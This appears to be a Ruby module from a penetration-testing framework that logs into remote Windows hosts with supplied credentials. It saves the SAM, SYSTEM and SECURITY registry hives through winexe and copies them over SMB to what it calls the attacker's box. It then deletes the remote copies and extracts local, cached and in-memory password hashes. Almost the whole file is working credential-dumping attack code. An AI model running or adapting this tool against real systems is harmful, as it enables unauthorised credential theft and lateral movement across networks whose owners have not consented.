require 'poet'
require 'cachedump'

class HashesWorkstation < Poet::Scanner
	#include Cachedump
	self.mod_name = "Workstation & Server Hashes"
	self.description = ""
	self.invasive = true

	def setup
		# Print title
		puts 
		title = "System Credential Dump"
		puts color_header(title)

		# Set up for WCE dump if configured
		@wce = Menu.opts[:wcedump]
		if @wce 
			if @timeout < 180
				@timout = @timeout + 180
			end

			# If either of the WCE binaries do not exist, skip
			if not File.exists? Menu.extbin[:wce]
				print_warning("WCE binary does not exist, skipping Windows digest dump")
				@wce = false
			end
		end

		@hashes = {}
	end

	def run(username, password, host)
		# local vars
		pwdump = Menu.extbin[:pwdump]
		cachedump = Menu.extbin[:cachedump]

		# Check directory structure
		create_folder("#{@log}/hashes") unless folder_exists("#{@log}/hashes")
		create_folder("#{@log}/hashes/#{host}") unless folder_exists("#{@log}/hashes/#{host}")
		
		# dump local hashes
		capture_stderr('/dev/null') {
			# export sam, system, security into %TEMP%
			smboptions = "--system //#{host}"
			clientoptions = "//#{host}/c$ -c"

			hashes = winexe(smboptions, "CMD /C reg.exe save HKLM\\SAM %TEMP%\\sam && reg.exe save HKLM\\SYSTEM %TEMP%\\sys && reg.exe save HKLM\\SECURITY %TEMP%\\sec")
			# Check if sam dump successful

			temp_directory = ''
			3.times do
				temp_directory = winexe(smboptions, "CMD /C echo %TEMP%").chomp
				break unless temp_directory.empty?
				sleep 3
			end

			temp_directory.gsub!('C:', '')

			# download registry hives to attackers box
			sam = smbclient(clientoptions, "get #{temp_directory}\\sam #{@log}/hashes/#{host}/sam")

			if not check_status(sam)
				print_warning("#{host.ljust(15)} - Issues downloading SAM")
			end

			security = smbclient(clientoptions, "get #{temp_directory}\\sec #{@log}/hashes/#{host}/security")
			if not check_status(security)
				print_warning("#{host.ljust(15)} - Issues downloading Security")
			end

			system = smbclient(clientoptions, "get #{temp_directory}\\sys #{@log}/hashes/#{host}/system")
			if not check_status(system)
				print_warning("#{host.ljust(15)} - Issues downloading SYSTEM")
			end

			# cleanup hashes on the remote system
			winexe = "--uninstall #{winexe}" unless @wce
			cleanup = winexe(smboptions, "CMD /C del %TEMP%\\sam %TEMP%\\sys %TEMP%\\sec")

			# validate hives exist locally
			if file_exists?("#{@log}/hashes/#{host}/sam")
				vprint_status("#{host.ljust(15)} - Registry Hives Exported")
				@success = @success + 1
			else
				print_bad("#{host.ljust(15)} - Issues Exporting Hashes")
				@failed = @failed + 1
			end

			full_print_line = ''
			has_hashes = false
			hashdump = ''

			# parse hashes out of registry hives locally
			begin
				hashdump = `#{pwdump} #{@log}/hashes/#{host}/system #{@log}/hashes/#{host}/sam`

				if hashdump.lines.count > 0 
					full_print_line << "#{highlight(hashdump.lines.count)} Local, ".ljust(10)
				else
					full_print_line << "#{highlight_red(hashdump.lines.count)} Local, ".ljust(10)				
				end
				has_hashes = true
			rescue
				vprint_bad("#{host.ljust(15)} - Issues extracing hashes from hives")
			end
		
		
			# run cachedump.py
			cachedcreds = ''
			type = ''
			cachedump = Cachedump.new
			begin
				sec = Cachedump::Hive.new("#{@log}/hashes/#{host}/security")
				sys = Cachedump::Hive.new("#{@log}/hashes/#{host}/system")
				cachedcreds, type = cachedump.run(sec,sys)
			rescue

			end

			if cachedcreds.lines.count > 0 
				has_hashes = true
				full_print_line << "#{highlight(cachedcreds.lines.count)} Cached, ".ljust(10)
			else
				full_print_line << "#{highlight_red(cachedcreds.lines.count)} Cached, ".ljust(10)
			end

			wcedump = ''
			# Dump with WCE if set in config
			if @wce
				wcedump = wce(username, password, host)
				if wcedump.lines.count > 0
					full_print_line << "#{highlight(wcedump.lines.count)} in Memory".ljust(10)
				else
					full_print_line << "#{highlight_red(wcedump.lines.count)} in Memory".ljust(10)
				end
			end

			print_good("#{host.ljust(15)} - Found #{full_print_line}") if has_hashes

			output_text = "#{host}\nSAM:\n#{hashdump}"
			output_text << "Cached:\n#{cachedcreds}" unless cachedcreds.empty?
			output_text << "In Memory:\n#{wcedump}" unless wcedump.empty?
	
			@hashes[host.to_sym] = [hashdump, cachedcreds, wcedump]
		}
	end

	def check_status(hive)
		if hive =~ /NT_STATUS_OBJECT_NAME_NOT_FOUND/
			print_bad("Unable to export #{hive}")
			return false
		elsif hive =~ /NT_STATUS_BAD_NETWORK_NAME/
			print_bad("Error: BAD_NETWORK_NAME")
			return false
		else
			return true
		end
	end

	def finish
		# Put ending titles
		puts "\nSystems with Hashes Dumped: #{@success}\n"
		puts "Hashdump failures: #{@failed}\n"

		uniq_hashdump = []
		uniq_cachedump = []
		uniq_memdump = []
		total_hashes = ""

		@hashes.each do |key, hash_set| 
			hash_set[0].each_line {|h| uniq_hashdump << h.strip unless h.empty?}
			hash_set[1].each_line {|h| uniq_cachedump << h.strip unless h.empty?}
			hash_set[2].each_line {|h| uniq_memdump << h.strip unless h.empty?}

			total_hashes << "#{'*'*32}#{key}#{'*'*32}\n*\tlocal:\n#{hash_set[0]}*\tcache:\n#{hash_set[1]}*\tmemory:\n#{hash_set[2]}"
		end
		uniq_hashdump.uniq!
		uniq_cachedump.uniq!
		uniq_memdump.uniq!

		# log results
		begin
			File.open("#{@log}/hashes/local_hashes_unique.txt", 'a') { |file| file.write(uniq_hashdump.join("\n") << "\n") }
			File.open("#{@log}/hashes/cached_hashes_unqiue.txt", 'a') { |file| file.write(uniq_cachedump.join("\n") << "\n") }
			File.open("#{@log}/hashes/memory_hashes_unique.txt", 'a') { |file| file.write(uniq_memdump.join("\n") << "\n") }
			File.open("#{@log}/hashes/all_hashes_byhost.txt", 'a') { |file| file.write(total_hashes) }
		rescue
			print_bad("#{host}: Issues Writing to #{@log}")
		end

		puts
		puts "Total unqiue hashes"
		puts "Local: #{uniq_hashdump.length}, Cache: #{uniq_cachedump.length}, Memory: #{uniq_memdump.length}"
		puts
		puts "Hashes are located at: #{@log}/hashes/"
		puts

		# Return to menu
		print "Press enter to Return to Dumping Hashes Menu"
		gets
	end
end
